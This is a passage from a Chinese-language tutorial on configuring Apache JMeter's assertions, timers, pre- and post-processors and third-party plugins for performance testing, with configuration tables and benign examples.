</table>
<h2 id="断言">3.5. 断言</h2>
<p>  断言用于对采样器进行额外的检查，并在同一范围内的每个采样器之后进行处理。</p>
<h3 id="响应断言">3.5.1. 响应断言</h3>
<p>  响应断言通过配置字符串，与请求报文或响应报文中的各个字段进行比较，根据比较结果，返回断言成功或失败，字符串的模板包含以下两种：</p>
<ol type="1">
<li>Contains,Matches：字符串包含或匹配，perl5 风格的正则表达式；</li>
<li>Equals,Substring：字符串等于或子集，纯文本内容，区分大小写。</li>
</ol>
<p>  例：某页面访问正常时，响应体中包含 <code>Pi Dashboard</code> 字段，对应的响应断言配置如下。</p>
<figure>
<img src="/p/22fcd8bb/响应断言配置示例.webp" alt="响应断言配置示例">
<figcaption aria-hidden="true">响应断言配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 89%">
<col style="width: 2%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Apply to:</td>
<td> 应用范围：<br>Main sample only：仅应用于主采样器<br>Sub-samples
only：仅应用于子采样器<br>Main sample and
sub-sample：应用于两者<br>Jmeter Variable Name to
use：将赋值给变量名</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Field to Test</td>
<td> 待测试字段，用于指示 JMeter 要断言测试请求或响应的哪个字段</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Ignore status</td>
<td> 忽略状态，选中时，在断言测试结果出来之前，默认是成功的</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Pattern Matching Rules</td>
<td> 模式匹配规则<br>Contains：正则表达式，文本与正则表达式匹配，则为 true<br>Matches：正则表达式，整个文本与正则表达式匹配，则为 true<br>Equals：纯字符串，文本与模式字符串相等时为 true，区分大小写<br>Substring：纯字符串，文本包含模式字符串时为 true，区分大小写</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Pattern to Test</td>
<td> 模式测试列表，每一条模式都将被测试，当其中一条
断言失败时，停止断言，断言结果为失败</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Custom failure message</td>
<td> 自定义失败信息，断言结果失败时，自定替换成您自定义的失败信息</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h3 id="持续时间断言">3.5.2. 持续时间断言</h3>
<p>  持续时间断言用于测试每个响应是否在指定时间内收到，任何消耗超过指定时间（毫秒）的响应，都将被标记为失败的响应。</p>
<p>  例：访问某页面的请求，通过持续时间断言，验证该页面是否在 5 秒内完成响应。</p>
<figure>
<img src="/p/22fcd8bb/持续时间断言配置示例.webp" alt="持续时间断言配置示例">
<figcaption aria-hidden="true">持续时间断言配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 34%">
<col style="width: 54%">
<col style="width: 11%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Duration in Milliseconds</td>
<td> 可被允许的响应耗时的最大值，单位为毫秒</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="大小断言">3.5.3. 大小断言</h3>
<p>  大小断言用于测试每个响应的字节大小，可以指定测试比较的类型，包含等于、不等于、大于等于、小于等于、大于、小于等。</p>
<p>  例：某用户登录的请求，当登录成功时响应报文的字节大小约为 25000Bytes，失败时约为 1041Bytes，大小配置示例如下。</p>
<figure>
<img src="/p/22fcd8bb/大小断言配置示例.webp" alt="大小断言配置示例">
<figcaption aria-hidden="true">大小断言配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 12%">
<col style="width: 83%">
<col style="width: 3%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Apply to:</td>
<td> 应用范围：<br>Main sample only：仅应用于主采样器<br>Sub-samples
only：仅应用于子采样器<br>Main sample and
sub-sample：应用于两者<br>Jmeter Variable Name to
use：将赋值给变量名</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Response Size Field to Test</td>
<td> 待测试响应大小的字段，包含：所有响应内容、响应头、响应体、响应状态码、响应消息等</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Size to bytes</td>
<td> 待测试的字节大小，支持填写 JMeter 变量名</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Type of Comparison</td>
<td> 比较类型，测试响应大小是否等于、不等于、大于等于、小于等于、大于、小于指定的字节大小</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="xml断言">3.5.4. XML 断言</h3>
<p>  XML 断言用于测试响应数据是否由正确的 XML 文档组成，需要注意的是，他不会根据 DTD 或模式语法校验 XML 字段内容。</p>
<figure>
<img src="/p/22fcd8bb/XML断言-断言结果输出示例.webp" alt="XML断言-断言结果输出示例">
<figcaption aria-hidden="true">XML 断言 - 断言结果输出示例</figcaption>
</figure>
<h3 id="html断言">3.5.5. HTML 断言</h3>
<p>  HTML 断言使用 JTidy 检查响应数据的 HTML 语法是否正确。</p>
<figure>
<img src="/p/22fcd8bb/HTML断言-断言结果输出示例.webp" alt="HTML断言-断言结果输出示例">
<figcaption aria-hidden="true">HTML 断言 - 断言结果输出示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 17%">
<col style="width: 75%">
<col style="width: 8%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> doctype</td>
<td> 文档类型，包含 omit（忽略遗留）、auto（自动）、strict（严格）、loose（松散）</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Format</td>
<td> 响应内容的格式，包含 HTML、XHTML、XML</td>
<td style="text-align: center;"> 是</td>
</tr>
<tr class="even">
<td> Errors only</td>
<td> 是否仅注意错误</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Error threshold</td>
<td> 错误阈值，将响应断言为失败之前的最大错误数量</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Warning threshold</td>
<td> 警告阈值，将响应断言为失败之前的最大警告数量</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Filename</td>
<td> 断言报告的文件名</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h3 id="xpath断言">3.5.6. XPath 断言</h3>
<p>  Xpath 断言可用于测试响应体的完整性，可以选择对照 DTD 进行验证，如果该 XPath 存在，则断言为真，断言支持布尔表达式。</p>
<p>  例：树莓派监控主页面访问成功后，页面左侧包含树莓派本机 IP，可使用如下 XPath 路径表达式进行断言验证。</p>
<figure>
<img src="/p/22fcd8bb/XPath断言配置示例.webp" alt="XPath断言配置示例">
<figcaption aria-hidden="true">XPath 断言配置示例</figcaption>
</figure>
<figure>
<img src="/p/22fcd8bb/XPath断言-断言结果输出示例.webp" alt="XPath断言-断言结果输出示例">
<figcaption aria-hidden="true"> XPath 断言 - 断言结果输出示例</figcaption>
</figure>
<h3 id="比较断言">3.5.7. 比较断言</h3>
<p>  比较断言可用于比较指定范围内的样本结果，支持比较内容、响应耗时等。</p>
<blockquote>
<p>注意：执行测试时不得添加此元件，会消耗大量 CPU、内存等系统资源，严重影响测试结果，仅在调试或验证时使用。</p>
</blockquote>
<figure>
<img src="/p/22fcd8bb/比较断言配置示例.webp" alt="比较断言配置示例">
<figcaption aria-hidden="true">比较断言配置示例</figcaption>
</figure>
<table style="width:100%;">
<colgroup>
<col style="width: 13%">
<col style="width: 81%">
<col style="width: 5%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Compare Content</td>
<td> 是否比较响应数据中的内容</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Compare Time</td>
<td> 如果值 &gt;=0，则检查响应时差是否小于该值，等于 0 时，意味着响应时间必须等于该值，默认为 - 1，即不比较响应耗时</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Comparision Filters</td>
<td> 比较过滤器，用于从内容中比较字符串。<br>Regex
String：通过正则表达式匹配到的字符串<br>Substitution：预期的字符串内容</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="json断言">3.5.8. JSON 断言</h3>
<p>  JSON 断言用于对 JSON 文档进行验证，断言的内容包含如下：</p>
<ol type="1">
<li>检查数据是否为 json 格式，如果解析失败，则断言失败；</li>
<li>使用 <code>Jayway JsonPath 1.2.0</code> 语法以搜索指定的路径，如果路径查找无结果，则断言失败；</li>
<li>如果在数据中查找到指定的路径，会根据预期值进行比较验证，如果未找到预期值，则断言失败；</li>
</ol>
<p>例：系统某接口请求的响应如下所示，若需要断言其中 2 班的第一个学生的姓名，则 JsonPath 表达式可填写如下：</p>
<ol type="1">
<li><code>$.student[1].class2[0].name</code></li>
</ol>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"student"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"class1"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"AAA"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"sex"</span><span class="punctuation">:</span> <span class="string">"F"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"20231701001"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"age"</span><span class="punctuation">:</span> <span class="number">15</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"BBB"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"sex"</span><span class="punctuation">:</span> <span class="string">"F"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"20231701002"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"age"</span><span class="punctuation">:</span> <span class="number">14</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"CCC"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"sex"</span><span class="punctuation">:</span> <span class="string">"M"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"20231701003"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"age"</span><span class="punctuation">:</span> <span class="number">15</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"class2"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"DDD"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"sex"</span><span class="punctuation">:</span> <span class="string">"M"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"20231702010"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"age"</span><span class="punctuation">:</span> <span class="number">35</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"EEE"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"sex"</span><span class="punctuation">:</span> <span class="string">"M"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"20231702011"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"age"</span><span class="punctuation">:</span> <span class="number">33</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"FFF"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"sex"</span><span class="punctuation">:</span> <span class="string">"M"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"20231702012"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"age"</span><span class="punctuation">:</span> <span class="number">29</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
<p>  jsonpath 表达式匹配测试的结果如下图。</p>
<figure>
<img src="/p/22fcd8bb/JSON断言-jsonpath匹配表达式示例.webp" alt="JSON断言-jsonpath匹配表达式示例">
<figcaption aria-hidden="true">JSON 断言 - jsonpath 匹配表达式示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 46%">
<col style="width: 46%">
<col style="width: 6%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Assert JSON Path exists</td>
<td> 要断言的 json 元素路径</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Additionally assert value</td>
<td> 如果要断言某些值，则勾选</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Match as regular expression</td>
<td> 如果要使用正则表达式来匹配，则勾选</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Expected Value</td>
<td> 预期值，如果预期值是数组类型，则输入：<code>[]</code></td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Expect null</td>
<td> 如果预期值为 null，则勾选</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Invert assertion<br>(will fail if above condition met)</td>
<td> 是否反转断言结果，如果断言结果为成功，则反转结果为失败</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h2 id="定时器">3.6. 定时器</h2>
<h3 id="常量定时器">3.6.1. 常量定时器</h3>
<p>  常量定时器可用于业务流程中相邻两个请求有固定等待时间需求的场景，该定时器会应用于所有的线程。</p>
<p>  例：在系统登录成功后，默认用户等待 5 秒后进行点击<code>个人信息</code>的操作。</p>
<table>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Thread Delay</td>
<td> 线程等待的时间，单位为毫秒</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="高斯随机定时器">3.6.2. 高斯随机定时器</h3>
<p>  此定时器将每个线程请求暂停随机时间，大多数时间间隔分布在特定值附近，总延迟是高斯分布值（平均 0.0 和标准偏差 1.0）乘以制定的偏差值和偏移值的总和。即：生成的随机数，围绕常数偏移量的变化，呈现高斯曲线分布。</p>
<table>
<colgroup>
<col style="width: 30%">
<col style="width: 57%">
<col style="width: 11%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Deviation</td>
<td> 偏差值，单位为毫秒</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Constant Delay Offset</td>
<td> 除了随机延迟外的固定延迟时间，单位为毫秒</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="均匀随机定时器">3.6.3. 均匀随机定时器</h3>
<p>  此定时器将每个线程请求暂停随机时间，每个时间间隔的发生概率相同，总延迟是随机值和偏移值的总和。</p>
<table>
<colgroup>
<col style="width: 30%">
<col style="width: 57%">
<col style="width: 11%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Random Delay Maximum</td>
<td> 随机延迟的最大时间，单位为毫秒</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Constant Delay Offset</td>
<td> 除了随机延迟外的固定延迟时间，单位为毫秒</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h2 id="预处理器">3.7. 预处理器</h2>
<h3 id="用户参数">3.7.1. 用户参数</h3>
<p>  用户参数预处理器用于指定单个线程的用户变量的值。对于每个线程，变量将按照顺序分配序列中的值，如果线程数大于值得数量，那么这些变量会重复使用。该元件一般配合线程数进行使用。如果有大量变量的需求，建议使用 <code>CSV数据集</code>元件。</p>
<p>  例：登录过程中，为每个线程分配一个登录用户。</p>
<table style="width:100%;">
<colgroup>
<col style="width: 36%">
<col style="width: 52%">
<col style="width: 11%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Update Once Per Iteration</td>
<td> 指示用户参数元素是否每次迭代更新一次</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="jdbc预处理器">3.7.2. JDBC 预处理器</h3>
<p>  JDBC 预处理器在采样器运行之前，执行特定的 SQL 语句。在 JDBC 采样器需要某些来自数据库中的数据，并且这些数据无法在初始化线程中计算获取时，会非常有用。</p>
<p>  例：在执行测试之前，清除数据库中的垃圾数据。</p>
<table>
<colgroup>
<col style="width: 23%">
<col style="width: 69%">
<col style="width: 7%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Variable Name Bound to Pool</td>
<td>JDBC 连接配置中的连接池名称</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Query Type</td>
<td>SQL 语句类型</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> SQL Query</td>
<td>SQL 语句，语句中带参数时，使用 <code>?</code> 占位</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Parameter values</td>
<td>SQL 语句中的参数，JMeter 会自动将 <code>?</code> 替换成对应的参数值，如有多个，用英文逗号分隔</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Parameter types</td>
<td>SQL 语句中参数的类型，如有多个，用英文逗号分隔</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Variable names</td>
<td> 变量名称，如有多个，用英文逗号分隔，用于保存从数据库返回的数据值列表</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Result variable name</td>
<td> 结果变量名称，包含返回数据值的键值变量</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Query timeout</td>
<td> 查询超时，单位为秒</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Limit ResultSet</td>
<td> 查询最大数据集</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Handle ResultSet</td>
<td> 数据集处理方式，包含：存储为字符串、存储为对象、计数等</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="采样器超时">3.7.3. 采样器超时</h3>
<p>  如果某个采样器样本完成的时间太长，可使用采样器超时预处理器进行控制，在达到指定的时间后样本仍未完成时，该处理器会使其中断。
&gt;
超时时间应该合理设置，太长会影响性能结果，太短则可能在正常的测试过程中触发。</p>
<table>
<colgroup>
<col style="width: 19%">
<col style="width: 69%">
<col style="width: 11%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Sample Timeout</td>
<td> 采样器超时时间，如果样本完成时间大于它，则会被中断</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h2 id="后置处理器">3.8. 后置处理器</h2>
<h3 id="正则表达式提取器">3.8.1. 正则表达式提取器</h3>
<p>  正则表达式提取器通过使用 Perl 风格的正则表达式，从一个采样器的响应报文中解析指定的内容，并存储为 JMeter 变量，在后续有需要的地方进行引用。</p>
<p>  例：在系统登录成功后，会生成 token 值（具备有效期和唯一性）存储在浏览器本地缓存中，后续的查询、创建、提交等操作，均需要携带 token 字段，否则后台服务器将会认为该请求未被鉴权，需要重新登录鉴权。</p>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 89%">
<col style="width: 3%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Apply to:</td>
<td> 应用范围：<br>Main sample only：仅应用于主采样器<br>Sub-samples
only：仅应用于子采样器<br>Main sample and
sub-sample：应用于两者<br>Jmeter Variable Name to
use：将赋值给变量名</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Field to check</td>
<td> 待检查的字段<br>Body：响应正文，不包含标题<br>Body (unescaped)：响应正文，替换了 HTML 转义代码（非必要时请勿使用，影响性能）<br>Body
as a
Document：转换为文本的响应正文（非必要时请勿使用，影响性能）<br>Request
Headers：请求头<br>Response
Headers：响应头<br>URL：请求的 URL 地址<br>Response
Code：响应状态码<br>Response Message：响应信息</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Name of created variable</td>
<td> 用于存储匹配结果的变量名称</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Regular Expression</td>
<td> 正则表达式</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Template</td>
<td> 用于引用正则表达式中的组，<code>$1$</code> 表示第 1 组，<code>$0$</code> 表示整个表达式匹配的任何内容</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Match No.(0 for Random)</td>
<td> 匹配序号，0 代表随机，正数 n 代表第 n 个匹配项</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Default Value</td>
<td> 默认值，当正则表达式未匹配到结果时，使用该默认值</td>
<td style="text-align: center;">否，但建议填写</td>
</tr>
<tr class="odd">
<td> Use empty default value</td>
<td> 使用空的默认值，当被选中时，<code>Default Value</code> 字段被清除，正则表达式未匹配到结果的情况下，将使用空字符串代替结果</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h3 id="xpath2提取器">3.8.2. XPath2 提取器</h3>
<p>  XPath2 提取器通过 XPath 查询表达式，从结构化响应 XML/(X) HTML 中提取指定的内容。</p>
<p>  例：系统登录完成后，主页面右上角展示登录用户名的名称，通过以下 XPath 表达式进行内容提取。</p>
<table>
<colgroup>
<col style="width: 22%">
<col style="width: 74%">
<col style="width: 3%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Apply to:</td>
<td> 应用范围：<br>Main sample only：仅应用于主采样器<br>Sub-samples
only：仅应用于子采样器<br>Main sample and
sub-sample：应用于两者<br>Jmeter Variable Name to
use：将赋值给变量名</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Name of created variable</td>
<td> 用于存储匹配结果的变量名称</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> XPath Query</td>
<td>XPath 查询表达式</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Match No.(0 for Random)</td>
<td> 匹配序号，0 代表随机，正数 n 代表第 n 个匹配项</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Default Value</td>
<td> 默认值，当正则表达式未匹配到结果时，使用该默认值</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Namespaces aliases list</td>
<td> 命名空间列表</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Return entire XPath fragment instead of text content?</td>
<td> 是否返回整个 XPath 片段而不是文本内容</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="json提取器">3.8.3. JSON 提取器</h3>
<p>  JSON 提取器能够从基于 <code>JSON-Path</code> 语法的响应报文中提取指定的数据，此后置处理器与<code>正则表达式提取器</code>很类似，可以非常方便的提取文本内容</p>
<blockquote>
<p>该提取器必须作为 HTTP 采样器或其它具有响应的采样器的子级</p>
</blockquote>
<p>  例：系统登录成功后，返回 json 格式的响应报文，报文中包含 token 字段，使用如下 json 表达式提取 token 字段对应的值。</p>
<table>
<colgroup>
<col style="width: 16%">
<col style="width: 78%">
<col style="width: 5%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Names of created varables</td>
<td> 用于存储匹配结果的变量名称</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> JSON Path Expressions</td>
<td>JSON 路径表达式</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Default Values</td>
<td> 默认值，当表达式未匹配到结果时，使用该默认值</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Match No.(0 for Random)</td>
<td> 匹配序号，0 代表随机，正数 n 代表第 n 个匹配项</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Compute concatenation var</td>
<td> 匹配结果是否串联。如果选中，则 JMeter 以 <code>,</code> 作为分隔符，将匹配到的所有结果串联起来，并存储到以 <code>&lt;variable_name&gt;_ALL</code> 变量中</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="第三方插件安装">4. 第三方插件安装</h1>
<p>  当 JMeter 自带的配置元件已经无法满足测试需求时，可通过 JMeter 插件官网，扩展安装更多的第三方插件，甚至可以参考 <code>jmeter_tutorial.pdf</code> 指导文件，自己开发所需要的插件。</p>
<ol type="1">
<li><p>访问 JMeter 插件官网，下载 <code>JMeter plugin Manager</code> 插件，并将其拷贝到 jmeter_home/lib/ext 目录下，插件的安装和管理都离不开它。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://jmeter-plugins.org/wiki/PluginsManager/</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>如果是互联网环境，那么可以启动 JMeter 后，点击右上角的插件管理器，直接在线查找、安装。卸载插件。</p>
<figure>
<img src="/p/22fcd8bb/插件管理器在线使用.webp" alt="插件管理器在线使用">
<figcaption aria-hidden="true">插件管理器在线使用</figcaption>
</figure></li>
<li><p>如果是离线环境，那么可以访问 JMeter 插件官网，查找并下载所需要的插件 <code>jar</code> 包后，同样将其拷贝到 jmeter_home/lib/ext 目录下，重启 JMeter 即可使用。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://jmeter-plugins.org/wiki/catalogue/</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
